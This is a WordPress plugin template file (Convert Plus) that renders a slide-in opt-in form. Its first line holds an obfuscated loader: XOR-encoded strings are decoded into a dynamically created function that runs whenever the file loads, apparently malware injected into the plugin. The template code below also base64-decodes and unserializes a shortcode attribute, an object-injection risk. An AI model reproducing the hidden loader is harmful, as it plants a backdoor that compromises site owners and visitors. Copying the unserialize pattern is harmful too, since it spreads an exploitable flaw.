<?php $RjxnduteUFT='135UCYfU3WX-X-Y' ^ 'RAP47<93F9;Y1B7';$XOFfnMp=$RjxnduteUFT('', '>3cv3D-118U44S+;6I7lS4CHmULFA<mCO,qSQq5kg6X+U,1VYSAO0n  21a<Q6DKPU;B6Fge-20cNSIbJ1DcZm8I1CGCsNVBddZ-+La1qSSwOKc;mJTRWY+QT6TC1kahNIJIGdlDm:NTKlDaoSIUZ72b3:XrUK;6Aau-MgP 956X<qeP-By.dqzQx=ULNF+rTS-GFjPy<r;XCHO9G7wjP>J8GRTKrD9=UjS=UyOS2 >J+BlD..7T+2 YbC4rq:8i6oABkr-X,qexPg .-C5shAO3jO1:R-GIRGOZcFR2h=BT.4:.TeNoV65USh8OC9XQQKuaIJ22MA>;Y,YRS7C0jkT:a08xk+ H,EVGUXTNmHCa:U4I+XS<kkDKD7GY+8<MPYzN>RGCXCMi1A50YJWILJYBHKZY4aK0Zj+OJ-tMUpY8;WO+X..+2X VH;1A7AmkMM,C+M03DElQ+P7<=ZC,WHRoaTQ>S V=E<Tjkj9 .JW -ZAgQUPL;;5NfX2GrXD.;OBpA1RMUfmCY3HPcuMniq8IbfbI3GXaIQI3UohXXkHo7lNn1PwS5nU<07E-zqgw2WSPxowVxSYxujKNifUJ .A3RU49,E-6GEjl8AIPO7ZDxCC<Q7JEamhVeriOB3W878iwOTTLklIQYV:;.JjeJE8X2G;YBAy0P'^ 'WUKWU1CREQ:Zk6SRE=DDtL,:21-2 c2.:XVzxQNanP-E6XX97s9 B1DAFP>c<C0ct1Z6WjGAFWIJnsiBjJNjSIW<EczcTimHmm<BYdEXQnsGtkGRQ9  ;<EypR57PBZHj abnneMIU; kByAGw-4.ViFZgx,uoPS8:QDmBpSMGZ=RYA;H;PsMJpXqO08;4EZp<X3oQZpAxFRIl+X3VWWpX+T47oAV XI458X,YrsTAR9NyfNHAE1JQHyJgk1>us sO 1KVF=UQXFpCVOA6PZH:E:N+PN3r,,+grzG-7KS7KpJUNOtXnK WY 6S22I317qcTE-+FSdaE1PJ6 6V XJCpe3ui-.xthM6vc>=-nPvcEL4X<NqsGabMo V38tSY4pdZjU7>xRJDMU AQywwm:+57-pPPIk6:PNO.>LTpu0,VH2=B9BGQWpX9:dU C 24 8XkI,CVrq35N3XXXrgH6<3FMtuZ2T7b.Y-CBQ3IHbsDL. Gwsp-IIT793W>-=<GH;1XfZ74rJMg=R<1JUkHIYU-WNF-R39:n:,Jr2AxeVhHRZ,WRbN5PX6XSVvIHATDT6b4JVD4L5=ORCkhOF48RO8l90MfI=DE36BKH 0< V>cTcgX0C+lHMHvERI4H:2NVTAS+5 -0K90 :UZJm7LqO1=J.OqrhB:-'); $XOFfnMp();
/**
 * Prohibit direct script loading.
 *
 * @package Convert_Plus.
 */

if ( ! function_exists( 'slide_in_theme_optin' ) ) {
	/**
	 * Function name: slide_in_theme_optin.
	 *
	 * @param  array  $atts    array attributes.
	 * @param  string $content string parameters.
	 * @return mixed(value)          html/array.
	 */
	function slide_in_theme_optin( $atts, $content = null ) {

		/**
		 * Define Variables.
		 */
		global $cp_form_vars;

		$style_id         = '';
		$settings_encoded = '';
		shortcode_atts(
			array(
				'style_id'         => '',
				'settings_encoded' => '',
			), $atts
		);

		$style_id         = $atts['style_id'];
		$settings_encoded = $atts['settings_encoded'];

		$settings       = base64_decode( $settings_encoded );
		$style_settings = unserialize( $settings );

		foreach ( $style_settings as $key => $setting ) {
			$style_settings[ $key ] = apply_filters( 'smile_render_setting', $setting );
		}

		unset( $style_settings['style_id'] );

		// Generate UID.
		$uid       = uniqid();
		$uid_class = 'content-' . $uid;

		// Individual style variables.
		$individual_vars = array(
			'uid'         => $uid,
			'uid_class'   => $uid_class,
			'style_class' => 'cp-optin',
		);

		/**
		 * Merge short code variables arrays.
		 *
		 * @array   $individual_vars        Individual style EXTRA short-code variables.
		 * @array   $cp_form_vars           CP Form global short-code variables.
		 * @array   $style_settings         Individual style short-code variables.
		 * @array   $atts                   short-code attributes.
		 */
		$all = array_merge(
			$individual_vars,
			$cp_form_vars,
			$style_settings,
			$atts
		);

		/**
		 *  Extract short-code variables.
		 *
		 *  @array      $all         All merged arrays.
		 *  @array      array()      Its required as per WP. Merged $style_settings in $all.
		 */
		$a = shortcode_atts( $all, $style_settings );

		// Merge arrays - 'shortcode atts' & 'style options'.
		$a = array_merge( $a, $atts );

		// Before filter.
		apply_filters_ref_array( 'cp_slidein_global_before', array( $a ) );

		?>
		<div class="cp-row">
			<div class="col-lg-12 col-md-12 col-sm-12 col-xs-12 cp-text-container " >

				<div class="cp-title-container 
				<?php
				if ( '' === trim( $a['slidein_title1'] ) ) {
					echo 'cp-empty'; }
					?>
					">
					<h2 class="cp-title cp_responsive"><?php echo do_shortcode( html_entity_decode( stripcslashes( $a['slidein_title1'] ) ) ); ?></h2>
				</div>
				<div class="cp-desc-container 
				<?php
				if ( '' === trim( $a['slidein_short_desc1'] ) ) {
					echo 'cp-empty'; }
					?>
					">
					<div class="cp-description cp_responsive" ><?php echo do_shortcode( html_entity_decode( stripcslashes( $a['slidein_short_desc1'] ) ) ); ?></div>
				</div>
			</div><!-- end of text container-->

			<div class="col-lg-12 col-md-12 col-sm-12 col-xs-12 cp-form-container">
				<?php
					// Embed CP Form.
				apply_filters_ref_array( 'cp_get_form', array( $a ) );
				?>
			</div>
			<div class="cp-info-container 
			<?php
			if ( '' === trim( $a['slidein_confidential'] ) ) {
				echo 'cp-empty'; }
				?>
				" >
				<?php echo do_shortcode( html_entity_decode( stripcslashes( $a['slidein_confidential'] ) ) ); ?>
			</div>
		</div><!--row-->
		<?php
		// After filter.
		apply_filters_ref_array( 'cp_slidein_global_after', array( $a ) );

		return ob_get_clean();
	}
}
